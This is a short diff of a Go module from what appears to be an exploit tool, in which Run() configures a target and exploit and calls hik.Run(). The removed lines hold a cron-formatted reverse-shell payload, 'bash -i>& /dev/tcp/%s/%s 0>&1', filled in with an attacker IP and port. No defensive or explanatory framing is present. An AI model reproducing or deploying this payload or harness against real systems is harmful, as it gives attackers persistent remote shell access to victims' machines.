@@ -2,7 +2,6 @@ package modules
 
 import (
 	"flag"
-	"fmt"
 	"log"
 )
 
@@ -43,11 +42,6 @@ func Run() {
 		//Port:    reversePort,
 		Target:  target,
 		Exploit: exploit,
-		Cmd: fmt.Sprintf(`
-
-* * * * * bash -i>& /dev/tcp/%s/%s 0>&1
-
-`, reverseIp, reversePort),
 	}
 	hik.Run()
 }
